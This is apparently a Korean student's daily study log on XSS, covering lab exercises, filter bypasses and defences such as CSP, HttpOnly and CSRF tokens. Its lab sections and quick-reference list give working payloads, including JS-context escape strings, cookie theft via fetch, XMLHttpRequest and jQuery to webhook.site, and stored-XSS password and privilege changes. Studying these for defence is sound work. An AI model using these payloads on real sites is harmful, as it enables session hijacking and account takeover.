---
title: "2026.02.03 (Day 69) - XSS 공격과 대응 전략"
date: 2026-02-03
draft: false
tags: ["XSS", "ReflectedXSS", "StoredXSS", "JS컨텍스트주입", "쿠키탈취", "fetch", "Blacklist우회", "CSP", "HttpOnly", "CSRF"]
categories: ["daily-logs"]
summary: "XSS 피해 유형(쿠키 탈취·피싱·키로거·코인 채굴)과 Reflected/Stored XSS 차이, JS 컨텍스트 탈출 및 fetch를 이용한 쿠키 탈취 실습, Blacklist 필터 우회 기법과 비밀번호 변경 공격 체인 분석"
---

# 📄 2026.02.03 (Day 69) - XSS 공격과 대응 전략

---

## 1. 핵심 개념 정리

### XSS 기본 개념 및 실제 피해 유형

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 1 | **XSS 정의** | 사용자 입력값이 응답에 그대로 노출되면서 JavaScript로 실행되는 취약점 | OWASP Top 10 포함 항목; 웹 애플리케이션에서 가장 빈번한 취약점 유형 중 하나 |
| 2 | **쿠키 탈취** | 공격자가 피해자의 document.cookie를 읽어 세션ID를 가져감 | 세션 하이재킹의 시작점; HttpOnly 플래그 설정으로 JS 접근 차단 가능 |
| 3 | **피싱 사이트 유도** | XSS를 통해 사용자를 가짜 로그인 페이지로 이동시킴 | 사회공학적 공격과 기술적 공격의 결합; URL 정밀 검증이 필수 |
| 4 | **키로거** | XSS를 통해 사용자의 실시간 키 입력을 JS로 캡처하여 수집 | 클라이언트측 방어가 어려운 공격 유형; 입력 폼의 이벤트 핸들러 감시 필요 |
| 5 | **코인 채굴 (Cryptojacking)** | JS 기반 브라우저 채굴기를 XSS로 삽입하여 피해자의 CPU 리소스를 활용 | 비정상적인 CPU 사용량 급증 탐지로 발견 가능; 백그라운드 실행 특성상 피해자 자체 감지 어려움 |

### XSS 대응 방법

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 6 | **HTML 인코딩 (근본적 대응)** | 모든 특수문자를 HTML entity로 변환 (< → &lt;, > → &gt;, " → &quot;, ' → &#39;) | 가장 안전한 대응 방법; 모든 입출력 지점에서 빠짐없이 적용해야 함 |
| 7 | **저장 시 치환** | DB에 저장하기 직전에 특수문자를 치환하여 저장 | 원본 데이터가 손실되어 웹 이외의 환경(API, CSV 등)에서 데이터가 깨질 수 있음 |
| 8 | **응답 시 치환** | 응답을 보내기 직전에 특수문자를 치환 | 원본 데이터가 DB에 유지되어 재활용 가능; 단, 모든 응답 경로에서 치환 적용이 필수 |
| 9 | **Whitelist 필터링** | 허용할 태그와 속성만 지정하고 나머지를 전부 차단 | 허용 목록이 명확한 경우 가장 강력한 필터링 방식; 오픈소스 라이브러리 활용 권장 |
| 10 | **Blacklist 필터링** | 차단할 태그와 키워드를 지정하고 나머지는 허용 | 대소문자 변환·중복 삽입 등 우회 기법이 다양하여 단독 사용 시 안전하지 않음 |

### XSS 유형 및 고급 공격 기법

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 11 | **Reflected XSS (반사형)** | 파라미터에 공격구문을 넣은 링크를 클릭하면 즉시 응답에 반사되어 실행 | 링크 배포(카톡, 이메일 등)를 통한 공격; 피해자의 직접 클릭이 필요 |
| 12 | **Stored XSS (저장형)** | 공격구문이 DB에 저장되어 해당 페이지를 조회하는 모든 사용자에게 실행 | 한 번의 삽입으로 다수의 피해자를 감염시킬 수 있는 고위험 공격 유형 |
| 13 | **JavaScript 컨텍스트 주입** | 기존 JS 코드 내의 문자열 값에 공격구문을 주입하여 제어 흐름을 변경 | 파라미터 반영 위치(HTML 본문 vs JS 문자열 내부)를 정확히 파악해야 공격 구문 설계 가능 |
| 14 | **AJAX를 이용한 백그라운드 탈출** | fetch() 또는 XMLHttpRequest를 사용하여 백그라운드로 쿠키를 외부 서버로 전송 | 표준 JS 요청이므로 피해자 자체 감지 불가; CSP와 네트워크 레벨 필터링이 유일한 차단 수단 |
| 15 | **Stored XSS + 권한 변경 결합** | 저장형 XSS를 활용하여 관리자 등의 특정 계정의 비밀번호를 무단 변경 | 세션 컨텍스트 내에서 실행되는 API 호출이므로 CSRF 토큰 검증 없이는 차단 불가 |

---

## 2. 실습 내용 정리

### 실습 67-1: XSS 문제 2번 - JavaScript 컨텍스트 탈출

**목표:** JS 함수 내 문자열 값에 주입하여 기존 함수의 실행 흐름을 단절하고 임의의 코드를 실행

**실습 환경:**
- 대상: lab.eqst.co.kr (JavaScript 내 파라미터 반영 환경)
- 도구: Burp Suite (Interceptor, Repeater)
- 기법: 문자열 종료 후 함수 종료 → 공격구문 실행 → 더미 함수로 나머지 감싸기

**실습 단계:**

1. 원래 코드 구조 파악
   - function fnEdit(_board_id) 내부에서 document.location.href에 [입력값] 직접 반영

2. 단순 문자열 주입 테스트 (eqstxss) → 정상 문자열로 반영됨 확인

3. 문자열 종료 및 코드 실행 주입
   - 주입값: eqstxss'; alert('xss'); var test='
   - 작은따옴표(')로 문자열 종료 → 세미콜론(;)으로 구문 분리 → alert 실행

4. 함수 종료를 포함하는 주입 (최종 성공)
   - 주입값: 19';} alert('xss'); function qwer() { var qwer='
   - 작은따옴표(') → 문자열 종료, 중괄호(}) → 함수 종료, alert 실행, 더미 함수로 나머지 감싸기

5. 최종 실행 결과
   - fnEdit 함수가 강제 종료되고 alert가 실행됨
   - 뒤이어 오는 코드는 더미 함수 qwer 내부로 감싸져 문법 오류 없이 파싱됨

**확인 항목:**
- 파라미터 값이 JS 문자열 내부에서 반영되는지 파악
- 작은따옴표(')로 문자열을 종료할 수 있는지 확인
- 세미콜론(;)과 중괄호(})로 기존 함수를 종료할 수 있는지 확인
- 주입된 공격구문이 실제로 실행되고, 나머지 JS 문법이 유효하게 유지되는지 검증

**보안 인사이트:**
- HTML 본문과 JS 문자열 내부는 이스케이프 규칙이 완전히 다름; JS 컨텍스트는 별도의 JS 이스케이프 처리가 필수
- 파라미터 반영 위치 파악이 공격구문 설계의 출발점
- 주입 후 남은 코드의 문법 유효성을 반드시 검증해야 실행 성공

---

### 실습 67-2: XSS 문제 6번 - 쿠키 탈취 (fetch + Webhook)

**목표:** JavaScript 컨텍스트 주입을 활용하여 피해자의 세션 쿠키를 외부 서버(webhook.site)로 탈취

**실습 환경:**
- 대상: lab.eqst.co.kr:8083 (exam17/noticeview.php)
- 외부 수신 서버: webhook.site
- 도구: Burp Suite, Native JS fetch API, jQuery $.ajax

**실습 단계:**

1. 기존 JS 구조 파악 및 컨텍스트 탈출 방식 재확인 (문제 2번과 동일한 구조)

2. location.href 방식 테스트
   - location.href = "https://webhook.site/[ID]/?cookie=" + document.cookie
   - 피해자 페이지 이동이 수반됨 → 발각 위험 높음

3. fetch를 이용한 백그라운드 탈출 (피해자 페이지 변화 없음 → 핵심 기법)
   - 페이로드: 19';} fetch("https://webhook.site/[ID]/?cookie=" + document.cookie); function test() { var test='

4. URL 인코딩 후 요청 전송
   - board_id 파라미터에 URL 인코딩된 페이로드 삽입

5. webhook.site 대시보드에서 수신된 쿠키값 확인
   - 수신 결과: 35bdfac8ace3ff45e9c1a2333356651e

**쿠키 탈취 동작 방식:**

1. 피해자가 공격구문이 포함된 URL 클릭
2. JS 컨텍스트 탈출 후 **fetch()** 가 백그라운드로 실행됨
3. **document.cookie** 의 세션ID 값이 webhook URL의 쿼리 파라미터로 전송됨
4. 공격자가 webhook.site 대시보드에서 탈취된 세션ID를 실시간 확인

**발견 가능한 취약점:**
- 세션ID 탈취 → 세션 하이재킹 → 피해자 계정 무단 접근
- **HttpOnly** 가 미설정된 경우 JS로 접근 가능한 모든 쿠키 탈취 가능
- 동일 도메인의 다른 서비스 쿠키도 document.cookie에 포함될 경우 연쇄 공격 가능

**탐지 패턴:**
- 비정상적인 외부 도메인으로의 HTTP 요청 탐지 (쿼리 파라미터에 세션/쿠키 값 포함)
- webhook.site 등 임시 외부 수신 서비스로의 트래픽 모니터링
- JS 컨텍스트 내 fetch/XMLHttpRequest 호출 패턴 분석

**방어 방법:**
- **HttpOnly** 플래그 설정 (JS로 쿠키 접근 차단)
- **CSP** 헤더로 외부 요청 도메인 제한 (connect-src 정책)
- 모든 입출력값에 HTML 인코딩 및 JS 이스케이프 적용

---

### 실습 67-3: XSS 문제 9번 - Blacklist 필터링 우회 및 비밀번호 변경 공격

**목표:** < 문자만 제거하는 필터를 우회하여 스크립트 실행을 실현하고, 이를 활용하여 타 계정의 비밀번호를 무단 변경하는 공격 시나리오 구성

**실습 환경:**
- 대상: lab.eqst.co.kr (게시판 기능 + 비밀번호 변경 API)
- 필터 규칙: content.replaceAll("<", "") — 꺾쇠 왼쪽 괄호만 제거
- 비밀번호 변경 API: GET /manage/changePw?newPassword=[값] (세션 기반 인증)

**실습 단계:**

1. 필터 규칙 분석
   - content.replaceAll("<", "") → '<'만 제거되고 '>'는 그대로 남음

2. 필터 우회 테스트
   - 입력: <>alert('xss');</script> → 결과: >alert('xss');</script> ('< '만 제거됨 확인)
   - 입력: <ScRIPt> → 대소문자 변환도 테스트

3. 비밀번호 변경 API 구조 파악
   - GET /manage/changePw?newPassword=1234
   - 서버 로직: 현재 로그인된 세션의 계정 비밀번호가 변경됨

4. Stored XSS를 이용한 비밀번호 변경 시나리오
   - 게시글 내용에 스크립트 삽입: fetch("https://test.com/manage/changePw?newPassword=1234")
   - 관리자가 해당 게시글을 열면, 관리자의 세션 컨텍스트에서 비밀번호 변경 API가 자동 호출됨

**확인 항목:**
- 필터가 '<'만 제거하는지, '>'는 남기는지 정확히 파악
- 비밀번호 변경 API가 세션 기반으로 동작하는지 확인
- CSRF 토큰 검증 여부 확인 (없으면 Stored XSS와 결합 시 강력한 공격)
- 공격 트리거 조건(관리자의 게시글 조회) → 실제 비밀번호 변경 결과 확인

**보안 인사이트:**
- Blacklist 필터는 단일 문자 제거 규칙이라도 우회 가능; '<'만 제거하면 나머지로 스크립트를 완성할 수 있음
- 비밀번호 변경 등 민감한 API에 CSRF 토큰 검증이 없으면, Stored XSS와 결합하여 강력한 권한 탈취 공격이 됨
- 세션 기반 API 호출의 보안은 단순 인증 확인 외에 반드시 CSRF 보호 기제가 필요

---

### 실습 67-4: 관리자 권한 우회 (파라미터 조작 + img 태그 트리거)

**목표:** 권한 변경 API의 파라미터를 직접 조작하고, img 태그를 활용하여 자동 요청을 트리거하여 관리자 권한을 무단 취득

**실습 환경:**
- 대상: lab.eqst.co.kr:8442 (bbs11)
- API: updateGetAuth (권한 업데이트 기능)
- 기법: adminYn 파라미터 조작 + img src를 이용한 자동 GET 요청

**실습 단계:**

1. 권한 업데이트 API 발견
   - URL: /bbs11/updateGetAuth?loginId=jjj@jj.com&adminYn=2
   - loginId와 adminYn 파라미터로 권한을 변경하는 API

2. img 태그를 활용한 자동 요청 트리거
   - img src에 해당 API URL을 삽입
   - img 태그 로드 시점에 해당 URL로 GET 요청이 자동 발생
   - 피해자가 해당 페이지를 방문하는 것만으로 공격 실행됨

3. 권한 변경 결과 확인
   - loginId 계정의 관리자 권한 변경 완료

**확인 항목:**
- 권한 변경 API가 클라이언트측 파라미터로만 동작하는지 확인
- 서버측 인가(Authorization) 검증이 적용되어 있는지 확인
- img 태그의 src 속성이 자동 요청을 유발하는지 확인
- 공격 실현 후 해당 계정의 권한 변경 상태 확인

**보안 인사이트:**
- 권한 변경 API에 적절한 인가 검증이 없으면 누구든 호출 가능; 이는 접근 통제의 기본 실패
- img 태그의 src 속성은 페이지 로드 시 자동 요청이므로 CSRF 공격의 주요 활용 벡터
- 권한 변경과 같은 민감한 기능은 반드시 POST 메서드 + CSRF 토큰 검증이 필요

---

## 3. 비교/분석 표

### Whitelist vs Blacklist 필터링 비교

| 항목 | Whitelist | Blacklist | 보안 강도 | 사용 시기/적용 방안 |
|:---:|:---|:---|:---|:---|
| **원리** | 허용할 태그와 속성만 지정, 나머지 전부 차단 | 차단할 태그와 키워드를 지정, 나머지 허용 | Whitelist가 현저히 강력 | 기본값으로 Whitelist 적용 권장 |
| **우회 난이도** | 높음 — 허용된 태그·속성 범위 내에서만 공격 가능 | 낮음 — 대소문자 변환, 중복 삽입, 단일 문자 조작 등 우회 기법 다양 | Blacklist 단독 사용 시 반드시 보완 조치 필요 | Blacklist를 사용할 경우 반드시 Whitelist와 병용 |
| **유지 부담** | 높음 — 허용 목록을 정확히 관리해야 함 | 낮음 — 차단할 항목만 추가하면 됨 | OWASP, 네이버 Lucy filter 등 오픈소스 라이브러리 활용 권장 | 오픈소스 라이브러리로 관리 부담 축소 |
| **실제 적용** | 게시판 에디터에서 허용할 HTML 태그(img, h1 등)를 명시적으로 지정 | script, iframe 등 특정 태그를 차단하고 나머지 허용 | 실제 환경에서는 두 방식을 결합하여 사용 | 민감도가 높은 서비스에는 Whitelist 우선 적용 |

### Reflected XSS vs Stored XSS 비교

| 항목 | Reflected XSS | Stored XSS | 피해 규모 | 탐지·대응 우선순위 |
|:---:|:---|:---|:---|:---|
| **공격구문 위치** | URL 파라미터에 포함, 클릭 시 즉시 응답에 반사 | DB에 저장되어 해당 페이지 조회 시 실행 | Stored XSS가 고위험 | Stored XSS 탐지·대응을 우선 |
| **피해 대상** | 공격 링크를 직접 클릭한 개별 사용자 | 해당 페이지를 조회하는 모든 사용자 | 다수 피해 가능성이 높음 | 게시판·공지사항 등 저장 기능 집중 점검 |
| **공격 요구사항** | 피해자가 공격 링크를 직접 클릭해야 함 | 공격구문 삽입 후 자동으로 다수 피해 | 배포 방법(카톡, 이메일 등)이 공격 성공의 열쇠 | 링크 배포 패턴 모니터링 필요 |
| **탐지 포인트** | URL에 공격구문 포함 패턴 탐지 가능 | 저장된 콘텐츠의 정적 분석이 필요 | IDS/WAF 시그니처 기반 탐지 활용 | 두 유형 모두 입출력 검증이 근본 대응 |

### 저장 시 치환 vs 응답 시 치환 비교

| 항목 | 저장 시 치환 | 응답 시 치환 | 장점 | 단점 및 주의사항 |
|:---:|:---|:---|:---|:---|
| **치환 시점** | DB에 저장하기 직전 | HTTP 응답을 보내기 직전 | — | — |
| **원본 데이터** | DB에 치환된 값이 저장됨 | DB에 원본 값이 그대로 유지됨 | 원본 보존이 필요한 경우 응답 시 치환 우선 | 저장 시 치환은 원본 복구가 어려움 |
| **활용 가능성** | 저장 자체로부터 안전; 추가 처리 불필요 | 원본 데이터를 API, CSV 등 다른 목적으로 재활용 가능 | 응답 시 치환이 유연성 측면에서 유리 | 응답 시 치환은 모든 응답 경로에서 빠짐없이 적용해야 함 |
| **위험 요소** | 웹 이외의 환경에서 데이터 깨짐 발생 가능 | 치환 적용이 누락되면 XSS 취약점 발생 | 두 방식 모두 장단점 존재 | 응답 시 치환의 경우 누락 포인트 감사 필수 |

---

## 4. 심화 분석

### Blacklist 필터링 우회 기법 상세 분석

| 구분 | 대소문자 변환 | 중복 삽입 | 단일 문자 조작 | 분석/인사이트 |
|:---:|:---|:---|:---|:---|
| **기법 원리** | 필터가 특정 대소문자 패턴만 차단하는 경우 다른 조합으로 우회 | 차단 키워드를 제거한 후 남은 부분이 다시 완성되는 구조 활용 | 특정 문자만 제거하면 나머지로 공격구문 완성 가능 | 각 우회 기법은 필터 규칙의 구체적 약점을 이용 |
| **예시** | `<ScRIPt>alert('xss')</ScRIPt>` | `<scri<script>pt>` → script 제거 후 `<script>` 완성 | content.replaceAll("<","") → > 남음 | Blacklist는 예측 불가한 우회가 항상 존재 |
| **필터 반응** | 필터가 소문자 script만 차단하면 대문자 조합은 통과 | 루프 없이 한 번만 치환하면 중복 삽입으로 우회 가능 | 반복 적용(루프)이 없으면 한 번 제거 후 완성됨 | 단일 규칙보다 복합 필터링 + Whitelist 병용이 필수 |

### JS 컨텍스트 주입 및 쿠키 탈취 - 취약 vs 안전 코드 비교

**[취약한 코드] - JS 컨텍스트 주입 발생 지점:**
- function fnEdit(_board_id) 내부에서 document.location.href에 _board_id를 이스케이프 없이 직접 연결
- 사용자 입력값이 JS 문자열 내부에 직접 반영됨

**[공격 흐름] - board_id 주입값:**
- 주입값: 19';} fetch("https://webhook.site/[ID]/?cookie=" + document.cookie); function test() { var test='
- 결과: fetch()가 백그라운드로 실행되어 세션 쿠키가 외부 서버로 전송됨

**[안전한 코드] - JS 이스케이프 처리:**
- function fnEdit(_board_id) 내부에서 **escapeForJS(_board_id)** 를 거친 값만 반영
- 주입된 특수문자(', ;, }, {} 등)가 이스케이프되어 문자열로만 처리됨
- 결과: 컨텍스트 탈출 및 코드 실행 불가

---

## 5. 실무/보안 적용

### 보안 전문가 관점 - XSS 탐지 및 대응 포인트

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **Reflected XSS** | URL 파라미터에 JS 실행 구문 포함·공격 링크 클릭 패턴·특수문자 비정상 사용 패턴 | GET /page?param=%3Cscript%3Ealert(1)%3C/script%3E | WAF 시그니처로 공격 URL 차단·모든 출력 지점에서 HTML 인코딩 강제·CSP 헤더 설정으로 인라인 스크립트 차단 |
| **Stored XSS** | 저장 요청(POST) 시 콘텐츠에 공격구문 포함·게시글 콘텐츠 정적 분석에서 script 태그 탐지·비정상적인 이벤트핸들러 속성 탐지 | POST /board/write { content: script 포함 } | 저장 전 입력값 Whitelist 필터링·오픈소스 필터 라이브러리 적용·저장된 콘텐츠 주기적 스캔 수행 |
| **외부 데이터 유출** | 외부 도메인으로의 비정상 HTTP 요청·쿼리 파라미터에 세션/쿠키 값 포함 탐지·webhook.site 등 임시 수신 서비스 활용 패턴 | GET https://webhook.site/[ID]/?cookie=35bdf... | CSP connect-src 정책으로 외부 요청 도메인 제한·HttpOnly + Secure 플래그 설정·네트워크 레벨에서 외부 요청 모니터링 및 알림 |

### XSS 방어 설정 (Nginx 기준)

**Content-Security-Policy 헤더:**
- default-src 'self'
- script-src 'self'
- img-src 'self' https:
- connect-src 'self'

**쿠키 보안 설정 (애플리케이션 레벨):**
- Set-Cookie: sessid=xxxxx; **HttpOnly**; **Secure**; **SameSite=Strict**

**레거시 브라우저 대응:**
- X-XSS-Protection: 1; mode=block

**MIME 타입 스니핑 방지:**
- X-Content-Type-Options: nosniff

### XSS 보안 점검 체크리스트

**입출력 보안:**
- [ ] 모든 사용자 입력값이 출력 시 HTML 인코딩됨
- [ ] JS 내 사용자 입력값이 JS 이스케이프 처리됨
- [ ] 콘텐츠 필터링이 Whitelist 방식으로 구현됨
- [ ] 오픈소스 필터 라이브러리가 적용됨

**세션 및 쿠키 보안:**
- [ ] HttpOnly 플래그 설정됨
- [ ] Secure 플래그 설정됨
- [ ] SameSite 속성 적절히 설정됨
- [ ] 세션 토큰이 충분한 엔트로피로 생성됨

**권한 및 API 보안:**
- [ ] 민감한 API에 CSRF 토큰 검증 적용됨
- [ ] 권한 변경 API에 적절한 인가 검증 적용됨
- [ ] 외부 요청이 CSP로 제한됨
- [ ] 변경 작업은 POST 메서드로만 처리됨

---

## 6. 배운 점 및 인사이트

### 새로 알게 된 점

- **XSS 공격의 실질적 피해 범위:** 단순한 alert 실행 너머로 쿠키 탈취, 피싱, 키로거, 코인 채굴까지 실제 피해로 확장되는 구조를 학습
- **JS 컨텍스트 주입의 차별점:** HTML 본문과 JS 문자열 내부는 이스케이프 규칙이 완전히 다르며, 반영 위치 파악이 공격 구문 설계의 핵심
- **Blacklist 필터의 한계와 우회 기법:** 대소문자 변환, 중복 삽입, 단일 문자 제거 등 우회 기법이 다양하여 단독 사용하면 안 됨
- **fetch()의 백그라운드 요청 특성:** 피해자가 인식하지 못하는 상태에서 데이터가 유출되는 구조; XSS와 결합 시 매우 강력한 공격 벡터
- **Stored XSS와 CSRF의 결합:** 저장형 XSS가 관리자 세션 내에서 실행되면 비밀번호 변경·권한 변경까지 가능한 복합 공격 체인이 됨

### 이전 학습과의 연결고리

- **SQL Injection과 연계:** SQL Injection으로 DB 조작 + XSS로 클라이언트측 공격까지 연장하면 풀스택 공격 시나리오가 완성됨
- **세션 보안 학습 확장:** 이전에 학습한 세션 하이재킹의 실제 공격 수단으로 XSS의 쿠키 탈취가 구체적으로 적용됨
- **파라미터 분석 → 실제 공격 실현:** 이전의 파라미터 탐색과 필터 우회 학습이 오늘의 XSS 실습에서 바로 활용되어 공격 성공에 기여

### 실무 적용 아이디어

**보안 전문가 관점:**
- **입출력 검증 감사:** 애플리케이션의 모든 사용자 입출력 지점에서 적절한 인코딩과 필터링이 적용되는지 체계적으로 확인
- **CSP 정책 설정 및 검증:** 도메인별 CSP 헤더를 설정하고 외부 리소스 접근 여부를 정기적으로 모니터링
- **민감한 API의 CSRF 토큰 검증 강화:** 권한 변경, 비밀번호 변경 등의 기능에 반드시 CSRF 토큰이 검증되는지 확인

**개발자 관점:**
- **프레임워크 기본 보안 기능 활용:** React, Angular 등 현대 프레임워크의 자동 인코딩 기능을 활용하되, 사용자 정의 HTML 렌더링 시 추가 검증 반드시 수행
- **오픈소스 필터 라이브러리 도입:** OWASP AntiSamy, 네이버 Lucy filter 등을 도입하여 콘텐츠 필터링을 체계적으로 관리하고 유지

---

## 7. Quick Reference

### HTML 인코딩 기본 치환

- < → **&lt;**
- > → **&gt;**
- " → **&quot;**
- ' → **&#39;**

### JS 컨텍스트 탈출 페이로드 구조

**기본형:**
- '); [공격구문]; var dummy='

**함수 종료 포함:**
- 19';} [공격구문]; function dummy() { var x='

### 쿠키 탈취 방법별 페이로드 (교육 참고용)

**Native JS (fetch):**
- fetch("https://webhook.site/[ID]/?cookie=" + document.cookie)

**Native JS (XMLHttpRequest):**
- var xhr = new XMLHttpRequest()
- xhr.open("GET", "https://webhook.site/[ID]/?cookie=" + document.cookie)
- xhr.send()

**jQuery ($.ajax):**
- $.ajax({ url: "https://webhook.site/[ID]/?cookie=" + document.cookie })

**img 태그를 이용한 자동 GET 요청 트리거 (CSRF):**
- img src 속성에 API URL 삽입 → 페이지 로드 시 자동 GET 요청 발생

### 핵심 개념 요약표

| 구분 | 항목 | 핵심 키워드 | 주요 내용 | 적용 방법 |
|:---:|:---|:---|:---|:---|
| 공격 | Reflected XSS | 반사형, 링크 클릭 | URL 파라미터 → 즉시 응답 반사 후 실행 | 공격 링크를 피해자에게 배포 |
| 공격 | Stored XSS | 저장형, DB 저장 | 공격구문이 DB에 저장 → 조회 시 실행 | 게시판 등 콘텐츠 저장 기능 활용 |
| 공격 | JS 컨텍스트 주입 | 문자열 탈출, 세미콜론 | JS 내 문자열 종료 후 임의 코드 실행 | 파라미터 반영 위치 파악 후 탈출 구문 설계 |
| 방어 | HTML 인코딩 | &lt; &gt; &quot; &#39; | 특수문자를 HTML entity로 변환 | 모든 출력 지점에 적용 |
| 방어 | CSP | Content-Security-Policy | 스크립트·리소스·외부 요청 소스 제한 | Nginx/Apache 응답 헤더로 설정 |
| 방어 | HttpOnly Cookie | HttpOnly, Secure, SameSite | JS로 쿠키 접근 차단 + 전송 보안 | Set-Cookie 헤더의 플래그로 설정 |

---

## 8. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| Blacklist 필터를 통과하지 못하는 경우 | 필터 규칙이 해당 공격구문 패턴을 차단 중 | 필터 규칙의 정확한 패턴과 치환 대상 파악 · 대소문자 변환 조합 시도 · 중복 삽입 기법 활용 |
| JS 컨텍스트 탈출 후 코드가 실행되지 않는 경우 | 주입 후 남은 JS 코드의 문법이 유효하지 않아 파싱 실패 | 전체 JS 함수 구조를 확인하고 주입 후 문법 유효성 검증 · 주입 후 남은 코드를 더미 함수로 감싸기 · 브라우저 개발도구 콘솔에서 JS 파싱 오류 확인 |
| fetch()로 쿠키 전송 후 webhook.site에서 수신 안됨 | URL 인코딩 오류 또는 네트워크 레벨 차단 | URL 인코딩 여부를 정확히 확인 · 브라우저 개발도구 네트워크 탭에서 실제 요청 확인 · webhook.site 수신 로그 직접 확인 |
| img 태그로 자동 요청을 트리거했는데 권한 변경 안됨 | API에 인가 검증이 있거나 세션 쿠키가 올바르지 않음 | 해당 API의 인가 로직 확인 · 세션 쿠키가 요청에 올바르게 포함되는지 확인 · 같은 도메인 내에서 요청이 이루어지는지 확인 |

---

**Today's Insight:**

오늘의 학습은 XSS의 단순한 개념 설명에서 벗어나 실제 공격과 방어의 전체 사이클을 직접 경험했다. JavaScript 컨텍스트 내의 주입이 HTML 본문과 어떻게 달라지는지, Blacklist 필터를 구체적으로 어떤 방법으로 우회할 수 있는지, 그리고 XSS가 쿠키 탈취와 권한 변경 공격까지 연결되는 공격 체인의 구조를 실습을 통해 확인했다. 특히 Stored XSS와 CSRF의 결합은 단일 취약점이 아닌 복합 공격 시나리오로 확장되는 실무적인 위험을 보여준 핵심 학습이었다. 앞으로의 학습에서는 이러한 복합 공격 시나리오를 더 깊이 분석하고, 보안 전문가로서의 탐지·대응 역량을 강화하는 방향으로 나아가야 한다.
